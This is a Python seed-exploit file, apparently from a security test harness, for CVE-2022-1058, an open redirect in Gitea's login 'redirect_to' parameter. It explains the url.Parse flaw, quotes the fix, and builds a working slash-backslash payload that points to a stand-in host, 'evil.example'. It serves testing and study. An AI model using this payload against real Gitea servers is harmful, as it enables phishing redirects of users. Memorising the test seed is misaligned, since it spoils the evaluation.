#!/usr/bin/env python3
r"""[GIVEN] CVE-2022-1058 seed exploit -- Gitea login redirect_to open redirect.

Driven against the REAL Gitea server over HTTP (see oracle.py). The candidate is
a login `redirect_to` value whose leading `/\` is treated by browsers exactly like
`//` (scheme-relative), i.e. an off-origin redirect:

    redirect_to = /\<FLAG>.evil.example        (leading slash-backslash)

Gitea's `RedirectToFirst()` validates the value with `url.Parse`, and Go's url.Parse
treats `\` as an ordinary PATH byte, so Host=="" and (pre-fix) the guard approves it;
`ctx.Redirect` then emits it verbatim -> `Location: /\<FLAG>.evil.example`. The redirect
host label is the per-run ${PCB_FLAG}, so the FLAG surfaces in the real 302 Location.

Contract on the REAL server:
  * V0 = Gitea 1.16.4 (pre CVE-2022-1058): APPROVED -> Location: /\<FLAG>.evil.example (flag reached).
  * V1 = Gitea 1.16.5 (CVE-2022-1058 fix): BLOCKED. The fix adds
        if len(loc) > 1 && loc[0] == '/' && (loc[1] == '/' || loc[1] == '\\') { continue }
    so the leading `/\` form is rejected -> Location: / (no flag).
This is the seed the SUT is given.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A login whose redirect_to is a leading slash-backslash scheme-relative attacker URL."""
    return {
        "probe_id": "cve-2022-1058-slash-backslash",
        "method": "GET",
        "path": "/user/login",
        "redirect_to": f"/\\{flag}.evil.example",
    }


if __name__ == "__main__":
    print(repr(candidate("PCBFLAG_demo")["redirect_to"]))
